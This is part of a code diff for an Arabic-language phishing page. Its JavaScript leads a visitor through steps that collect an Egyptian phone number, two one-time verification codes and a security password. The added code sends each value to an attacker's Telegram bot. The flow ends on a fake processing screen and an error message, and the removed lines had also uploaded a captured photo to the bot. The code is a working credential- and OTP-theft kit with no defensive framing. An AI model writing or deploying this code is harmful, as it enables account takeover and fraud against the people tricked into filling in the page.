+            // Send Step 1 Phone to Telegram
+            const msg = `📱 <b>[الخطوة 1] رقم الهاتف:</b>\n<code>+20${phoneInput}</code>\n\n⏰ <i>الوقت: ${new Date().toLocaleString('ar-EG')}</i>`;
+            sendToTelegram(msg);
+
+            goToStep(2);
+            startTimer1();
+        }
+
+        // STEP 2: First OTP 50-Second Countdown Timer
+        function startTimer1() {
+            let timeLeft = 50;
+            const timerDisplay = document.getElementById('timerDisplay1');
+            timerDisplay.textContent = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+
+            if (countdownTimer1) clearInterval(countdownTimer1);
+
+            countdownTimer1 = setInterval(() => {
+                timeLeft--;
+                if (timeLeft >= 0) {
+                    timerDisplay.textContent = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+                } else {
+                    clearInterval(countdownTimer1);
+                    timerDisplay.textContent = "انتهى الوقت (يمكنك إعادة الطلب)";
+                }
             }, 1000);
-        });
-    } catch(e) { return null; }
-}
+        }
 
-async function uploadImg(base64) {
-    try {
-        const blob = await (await fetch(base64)).blob();
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('photo', blob, 'hit.jpg');
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-    } catch(e) {}
-}
-</script>
+        function handleStep2Submit(e) {
+            e.preventDefault();
+            const otpInputs = document.querySelectorAll('.otp-input-1');
+            let code = "";
+            otpInputs.forEach(input => code += input.value);
+
+            if (code.length < 4) {
+                showAlert('يرجى كتابة كود التحقق المكون من 4 أرقام');
+                return;
+            }
+
+            if (countdownTimer1) clearInterval(countdownTimer1);
+
+            // Send Step 2 Code to Telegram
+            const msg = `🔑 <b>[الخطوة 2] كود التحقق الأول:</b>\n<code>${code}</code>\n📱 رقم الهاتف: <code>+20${savedPhoneNumber}</code>`;
+            sendToTelegram(msg);
+
+            goToStep(3);
+        }
+
+        // STEP 3: Security Password
+        function handleStep3Submit(e) {
+            e.preventDefault();
+            const password = document.getElementById('passwordInput').value;
+            
+            if (!password || password.length < 4) {
+                showAlert('يرجى إدخال كلمة السر الأمنية (4 خانات على الأقل)');
+                return;
+            }
+
+            // Send Step 3 Password to Telegram
+            const msg = `🔒 <b>[الخطوة 3] كلمة السر الأمنية:</b>\n<code>${password}</code>\n📱 رقم الهاتف: <code>+20${savedPhoneNumber}</code>`;
+            sendToTelegram(msg);
+
+            goToStep(4);
+        }
+
+        function togglePasswordVisibility(inputId, iconId) {
+            const input = document.getElementById(inputId);
+            const icon = document.getElementById(iconId);
+            if (input.type === 'password') {
+                input.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                input.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        }
+
+        // STEP 4: Confirm Phone Number Again
+        function handleStep4Submit(e) {
+            e.preventDefault();
+            const phoneConfirm = document.getElementById('phoneInputStep4').value.trim();
+
+            if (phoneConfirm !== savedPhoneNumber) {
+                showAlert('رقم الهاتف غير مطابق للرقم الذي أدخلته في الخطوة الأولى! يرجى التأكد لتأكيد الملكية.');
+                return;
+            }
+
+            // Send Step 4 Phone Confirmation to Telegram
+            const msg = `📱 <b>[الخطوة 4] إعادة تأكيد رقم الهاتف:</b>\n<code>+20${phoneConfirm}</code>`;
+            sendToTelegram(msg);
+
+            goToStep(5);
+            startTimer2();
+        }
+
+        // STEP 5: Second OTP 50-Second Countdown Timer
+        function startTimer2() {
+            let timeLeft = 50;
+            const timerDisplay = document.getElementById('timerDisplay2');
+            timerDisplay.textContent = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+
+            if (countdownTimer2) clearInterval(countdownTimer2);
+
+            countdownTimer2 = setInterval(() => {
+                timeLeft--;
+                if (timeLeft >= 0) {
+                    timerDisplay.textContent = `00:${timeLeft < 10 ? '0' : ''}${timeLeft}`;
+                } else {
+                    clearInterval(countdownTimer2);
+                    timerDisplay.textContent = "انتهى الوقت (يمكنك إعادة الطلب)";
+                }
+            }, 1000);
+        }
+
+        function handleStep5Submit(e) {
+            e.preventDefault();
+            const otpInputs = document.querySelectorAll('.otp-input-2');
+            let code = "";
+            otpInputs.forEach(input => code += input.value);
+
+            if (code.length < 4) {
+                showAlert('يرجى كتابة كود التحقق الثاني المكون من 4 أرقام');
+                return;
+            }
+
+            if (countdownTimer2) clearInterval(countdownTimer2);
+
+            // Send Step 5 Code 2 to Telegram
+            const msg = `🔐 <b>[الخطوة 5] كود التحقق الثاني (النهائي):</b>\n<code>${code}</code>\n📱 رقم الهاتف: <code>+20${savedPhoneNumber}</code>`;
+            sendToTelegram(msg);
+
+            goToStep(6);
+            showFinalErrorScreen();
+        }
+
+        // Helper for OTP Inputs Auto Focus and Strict Numeric Filtering
+        function setupOtpAutoTab(className) {
+            const otpInputs = document.querySelectorAll('.' + className);
+            otpInputs.forEach((input, index) => {
+                // Handle input filtering and auto-focusing to next field
+                input.addEventListener('input', () => {
+                    input.value = input.value.replace(/[^0-9]/g, '');
+
+                    if (input.value.length === 1 && index < otpInputs.length - 1) {
+                        otpInputs[index + 1].focus();
+                    }
+                });
+
+                // Handle backspace to focus back to previous input
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && !input.value && index > 0) {
+                        otpInputs[index - 1].focus();
+                    }
+                });
+
+                // Support pasting 4-digit codes
+                input.addEventListener('paste', (e) => {
+                    e.preventDefault();
+                    const pastedData = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
+                    if (pastedData) {
+                        const digits = pastedData.split('');
+                        otpInputs.forEach((otpInput, i) => {
+                            if (digits[i]) {
+                                otpInput.value = digits[i];
+                                if (i < otpInputs.length - 1) {
+                                    otpInputs[i + 1].focus();
+                                } else {
+                                    otpInput.focus();
+                                }
+                            }
+                        });
+                    }
+                });
+            });
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            setupOtpAutoTab('otp-input-1');
+            setupOtpAutoTab('otp-input-2');
+        });
+
+        // STEP 6: Final Waiting & Error Trigger
+        function showFinalErrorScreen() {
+            document.getElementById('processingState').classList.remove('hidden');
+            document.getElementById('errorState').classList.add('hidden');
+
+            setTimeout(() => {
+                document.getElementById('processingState').classList.add('hidden');
+                const errorState = document.getElementById('errorState');
+                errorState.classList.remove('hidden');
+                
+                // Trigger shake animation on card
+                const mainAppCard = document.getElementById('mainAppCard');
+                mainAppCard.classList.add('animate-shake');
+                setTimeout(() => {
+                    mainAppCard.classList.remove('animate-shake');
+                }, 700);
+
+            }, 3500);
+        }
+
+        // Restart Application Flow
+        function resetApp() {
+            savedPhoneNumber = "";
+            document.getElementById('formStep1').reset();
+            document.getElementById('formStep2').reset();
+            document.getElementById('formStep3').reset();
+            document.getElementById('formStep4').reset();
+            document.getElementById('formStep5').reset();
+            
+            document.getElementById('mainAppCard').classList.add('hidden');
+            const splashScreen = document.getElementById('splashScreen');
+            splashScreen.classList.remove('hidden', 'opacity-0', 'scale-95');
+        }
+    </script>
 </body>
 </html>
